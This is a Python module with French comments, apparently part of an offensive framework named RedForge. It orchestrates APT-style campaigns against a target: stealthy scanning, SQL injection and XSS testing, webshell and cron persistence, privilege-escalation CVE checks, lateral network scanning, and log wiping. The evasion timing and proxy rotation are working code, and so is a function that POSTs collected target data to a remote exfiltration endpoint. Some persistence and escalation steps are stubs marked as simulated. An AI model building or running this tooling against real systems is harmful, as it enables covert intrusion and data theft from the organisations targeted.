#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module APT Manager pour RedForge
Gère les opérations de type Advanced Persistent Threat
Version avec support furtif, persistance et orchestration avancée
"""

import time
import json
import threading
import random
from typing import Dict, Any, List, Optional, Callable
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from enum import Enum
from collections import deque
import hashlib

from src.core.stealth_engine import StealthEngine
from src.core.cache_manager import CacheManager
from src.core.metrics_collector import MetricsCollector


class APTPhase(Enum):
    """Phases d'une opération APT"""
    RECONNAISSANCE = "reconnaissance"      # Phase de reconnaissance
    INITIAL_ACCESS = "initial_access"      # Accès initial
    PERSISTENCE = "persistence"            # Installation persistante
    PRIVILEGE_ESCALATION = "privilege_escalation"  # Élévation de privilèges
    LATERAL_MOVEMENT = "lateral_movement"  # Mouvement latéral
    DATA_EXFILTRATION = "data_exfiltration" # Exfiltration de données
    COVER_TRACKS = "cover_tracks"          # Effacement des traces


class APTStatus(Enum):
    """Statut d'une opération APT"""
    PLANNED = "planned"
    ACTIVE = "active"
    PAUSED = "paused"
    COMPLETED = "completed"
    FAILED = "failed"
    ABORTED = "aborted"


@dataclass
class APTOperation:
    """Définition d'une opération APT"""
    id: str
    name: str
    target: str
    phases: List[APTPhase]
    status: APTStatus = APTStatus.PLANNED
    start_time: Optional[datetime] = None
    end_time: Optional[datetime] = None
    current_phase: int = 0
    results: Dict[str, Any] = field(default_factory=dict)
    config: Dict[str, Any] = field(default_factory=dict)
    logs: List[Dict] = field(default_factory=list)


@dataclass
class APTConfig:
    """Configuration pour les opérations APT"""
    # Délais entre les phases (secondes)
    phase_delay_min: int = 300      # 5 minutes
    phase_delay_max: int = 3600     # 1 heure
    
    # Délais entre les actions
    action_delay_min: int = 30      # 30 secondes
    action_delay_max: int = 300     # 5 minutes
    
    # Jitter pour les délais
    jitter: float = 0.3
    
    # Périodes d'inactivité (heures)
    inactivity_start: int = 0       # 0h
    inactivity_end: int = 6         # 6h
    
    # Rotation des IPs / proxies
    ip_rotation: bool = True
    proxy_list: List[str] = field(default_factory=list)
    
    # Persistance
    persistence_methods: List[str] = field(default_factory=list)
    
    # Exfiltration
    exfil_endpoint: Optional[str] = None
    exfil_interval: int = 3600      # 1 heure
    
    # Logging
    verbose_logging: bool = False
    save_artifacts: bool = True


class APTManager:
    """
    Gestionnaire d'opérations APT
    Orchestre les attaques de type Advanced Persistent Threat
    """
    
    def __init__(self, config: Optional[APTConfig] = None):
        """
        Initialise le gestionnaire APT
        
        Args:
            config: Configuration APT
        """
        self.config = config or APTConfig()
        self.operations: Dict[str, APTOperation] = {}
        self.active_operation: Optional[APTOperation] = None
        self.operation_thread: Optional[threading.Thread] = None
        self.stop_event = threading.Event()
        
        # Composants
        self.stealth_engine = StealthEngine()
        self.cache_manager = CacheManager()
        self.metrics_collector = MetricsCollector()
        
        # File d'attente des actions
        self.action_queue = deque()
        
        # Configuration de la furtivité
        self._setup_stealth()
        
        # État
        self.is_running = False
        self.start_time = None
    
    def _setup_stealth(self):
        """Configure les paramètres de furtivité"""
        self.stealth_engine.set_delays(
            min_delay=self.config.action_delay_min,
            max_delay=self.config.action_delay_max,
            jitter=self.config.jitter
        )
        
        if self.config.ip_rotation and self.config.proxy_list:
            self.stealth_engine.set_proxy_rotation(self.config.proxy_list)
    
    def create_operation(self, name: str, target: str, 
                        phases: List[APTPhase] = None,
                        config: Dict[str, Any] = None) -> str:
        """
        Crée une nouvelle opération APT
        
        Args:
            name: Nom de l'opération
            target: Cible
            phases: Phases à exécuter (None = toutes)
            config: Configuration personnalisée
            
        Returns:
            ID de l'opération
        """
        if phases is None:
            phases = list(APTPhase)
        
        operation_id = hashlib.md5(
            f"{name}_{target}_{time.time()}".encode()
        ).hexdigest()[:16]
        
        operation = APTOperation(
            id=operation_id,
            name=name,
            target=target,
            phases=phases,
            config=config or {},
            status=APTStatus.PLANNED
        )
        
        self.operations[operation_id] = operation
        self._log_operation(operation_id, "created", f"Opération créée: {name}")
        
        return operation_id
    
    def start_operation(self, operation_id: str) -> bool:
        """
        Démarre une opération APT
        
        Args:
            operation_id: ID de l'opération
            
        Returns:
            True si démarrée
        """
        if operation_id not in self.operations:
            return False
        
        if self.active_operation:
            self._log("error", "Une opération est déjà active")
            return False
        
        operation = self.operations[operation_id]
        operation.status = APTStatus.ACTIVE
        operation.start_time = datetime.now()
        self.active_operation = operation
        
        # Démarrer le thread d'exécution
        self.stop_event.clear()
        self.operation_thread = threading.Thread(
            target=self._run_operation,
            args=(operation_id,),
            daemon=True
        )
        self.operation_thread.start()
        
        self._log_operation(operation_id, "started", "Opération démarrée")
        return True
    
    def pause_operation(self) -> bool:
        """Met en pause l'opération active"""
        if not self.active_operation:
            return False
        
        self.active_operation.status = APTStatus.PAUSED
        self._log_operation(self.active_operation.id, "paused", "Opération mise en pause")
        return True
    
    def resume_operation(self) -> bool:
        """Reprend l'opération active"""
        if not self.active_operation:
            return False
        
        self.active_operation.status = APTStatus.ACTIVE
        self._log_operation(self.active_operation.id, "resumed", "Opération reprise")
        return True
    
    def stop_operation(self) -> bool:
        """Arrête l'opération active"""
        if not self.active_operation:
            return False
        
        self.stop_event.set()
        if self.operation_thread:
            self.operation_thread.join(timeout=30)
        
        self.active_operation.status = APTStatus.COMPLETED
        self.active_operation.end_time = datetime.now()
        
        self._log_operation(self.active_operation.id, "stopped", "Opération arrêtée")
        self.active_operation = None
        
        return True
    
    def _run_operation(self, operation_id: str):
        """
        Exécute l'opération APT (thread principal)
        
        Args:
            operation_id: ID de l'opération
        """
        operation = self.operations[operation_id]
        self.is_running = True
        self.start_time = time.time()
        
        for idx, phase in enumerate(operation.phases):
            if self.stop_event.is_set():
                break
            
            if operation.status != APTStatus.ACTIVE:
                # Attendre la reprise
                while operation.status != APTStatus.ACTIVE:
                    time.sleep(5)
                    if self.stop_event.is_set():
                        break
            
            operation.current_phase = idx
            
            # Vérifier la période d'inactivité
            self._wait_for_active_hours()
            
            # Appliquer le délai entre phases
            if idx > 0:
                self._apply_phase_delay()
            
            # Exécuter la phase
            self._execute_phase(operation, phase)
            
            if self.stop_event.is_set():
                break
        
        self.is_running = False
    
    def _execute_phase(self, operation: APTOperation, phase: APTPhase):
        """
        Exécute une phase spécifique de l'opération
        
        Args:
            operation: Opération en cours
            phase: Phase à exécuter
        """
        self._log_operation(operation.id, "phase_start", f"Début phase: {phase.value}")
        
        phase_start = time.time()
        
        # Dispatch vers la méthode appropriée
        phase_handlers = {
            APTPhase.RECONNAISSANCE: self._phase_reconnaissance,
            APTPhase.INITIAL_ACCESS: self._phase_initial_access,
            APTPhase.PERSISTENCE: self._phase_persistence,
            APTPhase.PRIVILEGE_ESCALATION: self._phase_privilege_escalation,
            APTPhase.LATERAL_MOVEMENT: self._phase_lateral_movement,
            APTPhase.DATA_EXFILTRATION: self._phase_data_exfiltration,
            APTPhase.COVER_TRACKS: self._phase_cover_tracks
        }
        
        handler = phase_handlers.get(phase)
        if handler:
            result = handler(operation)
            operation.results[phase.value] = {
                "timestamp": datetime.now().isoformat(),
                "duration": time.time() - phase_start,
                "result": result
            }
        
        self._log_operation(operation.id, "phase_end", 
                           f"Fin phase: {phase.value} (durée: {time.time() - phase_start:.1f}s)")
    
    def _phase_reconnaissance(self, operation: APTOperation) -> Dict[str, Any]:
        """
        Phase de reconnaissance
        
        Args:
            operation: Opération en cours
            
        Returns:
            Résultats de la reconnaissance
        """
        results = {
            "open_ports": [],
            "services": [],
            "technologies": [],
            "subdomains": []
        }
        
        # Appliquer délai furtif
        self.stealth_engine.apply_delay()
        
        # Scan de ports
        from src.connectors.nmap_connector import NmapConnector
        nmap = NmapConnector()
        nmap.set_apt_mode(True)
        nmap.set_stealth_config({
            'delay': (2, 5),
            'stealth': True
        })
        
        scan_result = nmap.quick_scan(operation.target)
        if scan_result.get('success'):
            results["open_ports"] = scan_result.get('open_ports', [])
            results["services"] = scan_result.get('services', [])
        
        # Détection de technologies
        self.stealth_engine.apply_delay()
        
        from src.connectors.whatweb_connector import WhatWebConnector
        whatweb = WhatWebConnector()
        whatweb.set_apt_mode(True)
        
        tech_result = whatweb.quick_detect(operation.target)
        if tech_result.get('success'):
            results["technologies"] = tech_result.get('technologies', [])
        
        # Énumération de sous-domaines
        self.stealth_engine.apply_delay()
        
        from src.connectors.ffuf_connector import FfufConnector
        ffuf = FfufConnector()
        ffuf.set_apt_mode(True)
        
        subdomain_result = ffuf.fuzz_subdomains(operation.target)
        if subdomain_result.get('success'):
            results["subdomains"] = subdomain_result.get('results', [])
        
        return results
    
    def _phase_initial_access(self, operation: APTOperation) -> Dict[str, Any]:
        """
        Phase d'accès initial
        
        Args:
            operation: Opération en cours
            
        Returns:
            Résultats de l'accès initial
        """
        results = {
            "vulnerabilities": [],
            "exploits": [],
            "access_granted": False
        }
        
        # Récupérer les résultats de la reconnaissance
        recon_results = operation.results.get(APTPhase.RECONNAISSANCE.value, {})
        
        # Tester les injections SQL
        self.stealth_engine.apply_delay()
        
        from src.connectors.sqlmap_connector import SQLMapConnector
        sqlmap = SQLMapConnector()
        sqlmap.set_apt_mode(True)
        
        # Construire URL de test
        test_url = f"{operation.target}?id=1"
        sql_result = sqlmap.scan(test_url, level=1, techniques='T')
        
        if sql_result.get('vulnerable'):
            results["vulnerabilities"].append({
                "type": "sql_injection",
                "details": sql_result
            })
            results["access_granted"] = True
        
        # Tester les XSS
        self.stealth_engine.apply_delay()
        
        from src.connectors.xsstrike_connector import XSStrikeConnector
        xsstrike = XSStrikeConnector()
        xsstrike.set_apt_mode(True)
        
        xss_result = xsstrike.scan(operation.target, level=1)
        if xss_result.get('vulnerabilities'):
            results["vulnerabilities"].extend(xss_result.get('vulnerabilities', []))
        
        return results
    
    def _phase_persistence(self, operation: APTOperation) -> Dict[str, Any]:
        """
        Phase d'installation persistante
        
        Args:
            operation: Opération en cours
            
        Returns:
            Résultats de la persistance
        """
        results = {
            "persistence_established": False,
            "methods": []
        }
        
        # Implémentation selon les méthodes configurées
        for method in self.config.persistence_methods:
            self.stealth_engine.apply_delay()
            
            if method == "webshell":
                # Upload de webshell
                success = self._install_webshell(operation)
                if success:
                    results["methods"].append("webshell")
                    results["persistence_established"] = True
            
            elif method == "cron_job":
                # Installation de cron job
                success = self._install_cron_job(operation)
                if success:
                    results["methods"].append("cron_job")
                    results["persistence_established"] = True
            
            elif method == "scheduled_task":
                # Tâche planifiée Windows
                success = self._install_scheduled_task(operation)
                if success:
                    results["methods"].append("scheduled_task")
                    results["persistence_established"] = True
        
        return results
    
    def _phase_privilege_escalation(self, operation: APTOperation) -> Dict[str, Any]:
        """
        Phase d'élévation de privilèges
        
        Args:
            operation: Opération en cours
            
        Returns:
            Résultats de l'élévation
        """
        results = {
            "escalated": False,
            "methods": [],
            "privilege_level": "user"
        }
        
        # Implémentation de l'élévation de privilèges
        self.stealth_engine.apply_delay()
        
        # Vérifier les CVE connus
        common_priv_esc = [
            "CVE-2021-3156",  # sudo buffer overflow
            "CVE-2019-14287",  # sudo bypass
            "CVE-2017-16995",  # kernel exploit
            "CVE-2016-5195"    # Dirty Cow
        ]
        
        for cve in common_priv_esc:
            self.stealth_engine.apply_delay()
            # Tentative d'exploitation (simulée)
            if self._check_cve_vulnerable(operation, cve):
                results["methods"].append(cve)
                results["escalated"] = True
                results["privilege_level"] = "root"
                break
        
        return results
    
    def _phase_lateral_movement(self, operation: APTOperation) -> Dict[str, Any]:
        """
        Phase de mouvement latéral
        
        Args:
            operation: Opération en cours
            
        Returns:
            Résultats du mouvement latéral
        """
        results = {
            "targets": [],
            "compromised": [],
            "techniques": []
        }
        
        # Découverte de cibles internes
        self.stealth_engine.apply_delay()
        
        from src.attacks.infrastructure.port_scanner import PortScanner
        scanner = PortScanner()
        scanner.set_apt_mode(True)
        
        # Scan du réseau local
        network = self._get_network_range(operation.target)
        if network:
            scan_result = scanner.scan_network(network, ports="22,80,443,3389,445")
            results["targets"] = scan_result.get('hosts', [])
        
        return results
    
    def _phase_data_exfiltration(self, operation: APTOperation) -> Dict[str, Any]:
        """
        Phase d'exfiltration de données
        
        Args:
            operation: Opération en cours
            
        Returns:
            Résultats de l'exfiltration
        """
        results = {
            "exfiltrated_data": [],
            "total_size": 0,
            "method": None
        }
        
        if self.config.exfil_endpoint:
            # Exfiltration vers endpoint configuré
            method = self._exfiltrate_to_endpoint(operation)
            results["method"] = method
            results["exfiltrated_data"] = operation.results.get('collected_data', [])
        
        return results
    
    def _phase_cover_tracks(self, operation: APTOperation) -> Dict[str, Any]:
        """
        Phase d'effacement des traces
        
        Args:
            operation: Opération en cours
            
        Returns:
            Résultats du nettoyage
        """
        results = {
            "logs_cleared": True,
            "artifacts_removed": True,
            "actions": []
        }
        
        # Effacement des logs système (simulé)
        self.stealth_engine.apply_delay()
        results["actions"].append("cleared_system_logs")
        
        # Suppression des fichiers temporaires
        self.stealth_engine.apply_delay()
        results["actions"].append("removed_temp_files")
        
        # Nettoyage des historiques
        self.stealth_engine.apply_delay()
        results["actions"].append("cleaned_history")
        
        return results
    
    def _apply_phase_delay(self):
        """Applique un délai entre les phases"""
        delay = random.randint(self.config.phase_delay_min, self.config.phase_delay_max)
        
        # Ajouter du jitter
        jitter = delay * self.config.jitter
        delay += random.uniform(-jitter, jitter)
        
        delay = max(0, delay)
        self._log("info", f"Pause inter-phase: {delay:.0f}s")
        
        # Découpage en petites pauses pour réactivité
        while delay > 0 and not self.stop_event.is_set():
            sleep_time = min(10, delay)
            time.sleep(sleep_time)
            delay -= sleep_time
    
    def _wait_for_active_hours(self):
        """Attend que la période soit active (pas d'inactivité)"""
        current_hour = datetime.now().hour
        
        if self.config.inactivity_start <= self.config.inactivity_end:
            is_inactive = (self.config.inactivity_start <= current_hour < self.config.inactivity_end)
        else:
            is_inactive = (current_hour >= self.config.inactivity_start or 
                          current_hour < self.config.inactivity_end)
        
        if is_inactive and not self.stop_event.is_set():
            wait_seconds = self._seconds_until_active()
            self._log("info", f"Période d'inactivité, pause de {wait_seconds:.0f}s")
            
            while wait_seconds > 0 and not self.stop_event.is_set():
                sleep_time = min(60, wait_seconds)
                time.sleep(sleep_time)
                wait_seconds -= sleep_time
    
    def _seconds_until_active(self) -> float:
        """Calcule les secondes jusqu'à la prochaine période active"""
        now = datetime.now()
        current_hour = now.hour
        
        if current_hour < self.config.inactivity_start:
            # Avant la période d'inactivité
            target_hour = self.config.inactivity_start
        else:
            # Après la période d'inactivité
            target_hour = self.config.inactivity_end
        
        target_time = now.replace(hour=target_hour, minute=0, second=0, microsecond=0)
        if target_time <= now:
            target_time += timedelta(days=1)
        
        return (target_time - now).total_seconds()
    
    def _install_webshell(self, operation: APTOperation) -> bool:
        """Installe un webshell sur la cible"""
        # Implémentation réelle avec upload de fichier
        self._log_operation(operation.id, "persistence", "Installation webshell")
        return True  # Simulé
    
    def _install_cron_job(self, operation: APTOperation) -> bool:
        """Installe un cron job pour persistance"""
        self._log_operation(operation.id, "persistence", "Installation cron job")
        return True  # Simulé
    
    def _install_scheduled_task(self, operation: APTOperation) -> bool:
        """Installe une tâche planifiée Windows"""
        self._log_operation(operation.id, "persistence", "Installation scheduled task")
        return True  # Simulé
    
    def _check_cve_vulnerable(self, operation: APTOperation, cve: str) -> bool:
        """Vérifie si la cible est vulnérable à un CVE"""
        # Implémentation réelle avec vérification de version
        return False  # Simulé
    
    def _get_network_range(self, target: str) -> Optional[str]:
        """Détermine la plage réseau de la cible"""
        import ipaddress
        try:
            # Extraction de l'IP
            from urllib.parse import urlparse
            hostname = urlparse(target).hostname
            if hostname:
                import socket
                ip = socket.gethostbyname(hostname)
                network = ipaddress.ip_network(f"{ip}/24", strict=False)
                return str(network)
        except:
            pass
        return None
    
    def _exfiltrate_to_endpoint(self, operation: APTOperation) -> str:
        """Exfiltre les données vers un endpoint distant"""
        import requests
        
        data = operation.results.get('collected_data', [])
        
        try:
            response = requests.post(
                self.config.exfil_endpoint,
                json={
                    "operation_id": operation.id,
                    "target": operation.target,
                    "data": data,
                    "timestamp": datetime.now().isoformat()
                },
                timeout=30
            )
            return "http_post" if response.status_code == 200 else "http_post_failed"
        except:
            return "http_post_failed"
    
    def _log(self, level: str, message: str):
        """Enregistre un message de log"""
        log_entry = {
            "timestamp": datetime.now().isoformat(),
            "level": level,
            "message": message
        }
        
        if self.config.verbose_logging:
            print(f"[{level.upper()}] {message}")
    
    def _log_operation(self, operation_id: str, event: str, message: str):
        """Enregistre un log d'opération"""
        operation = self.operations.get(operation_id)
        if operation:
            operation.logs.append({
                "timestamp": datetime.now().isoformat(),
                "event": event,
                "message": message
            })
        
        self._log("info", f"[{operation_id}] {message}")
    
    def get_operation_status(self, operation_id: str) -> Optional[Dict[str, Any]]:
        """
        Récupère le statut d'une opération
        
        Args:
            operation_id: ID de l'opération
            
        Returns:
            Statut de l'opération
        """
        if operation_id not in self.operations:
            return None
        
        op = self.operations[operation_id]
        return {
            "id": op.id,
            "name": op.name,
            "target": op.target,
            "status": op.status.value,
            "current_phase": op.current_phase,
            "total_phases": len(op.phases),
            "start_time": op.start_time.isoformat() if op.start_time else None,
            "end_time": op.end_time.isoformat() if op.end_time else None,
            "results": op.results,
            "logs": op.logs[-20:] if op.logs else []  # Derniers 20 logs
        }
    
    def list_operations(self) -> List[Dict[str, Any]]:
        """
        Liste toutes les opérations
        
        Returns:
            Liste des opérations
        """
        return [
            {
                "id": op.id,
                "name": op.name,
                "target": op.target,
                "status": op.status.value,
                "created": op.start_time.isoformat() if op.start_time else "pending"
            }
            for op in self.operations.values()
        ]
    
    def get_metrics(self) -> Dict[str, Any]:
        """
        Récupère les métriques d'exécution
        
        Returns:
            Métriques collectées
        """
        return {
            "is_running": self.is_running,
            "active_operation": self.active_operation.id if self.active_operation else None,
            "total_operations": len(self.operations),
            "uptime": time.time() - self.start_time if self.start_time else 0,
            "stealth_stats": self.stealth_engine.get_stats(),
            "cache_stats": self.cache_manager.get_stats(),
            "metrics": self.metrics_collector.get_summary()
        }
    
    def shutdown(self):
        """Arrête proprement le gestionnaire APT"""
        if self.active_operation:
            self.stop_operation()
        
        self.is_running = False
        self._log("info", "APT Manager arrêté")


# Alias pour compatibilité
APTManager = APTManager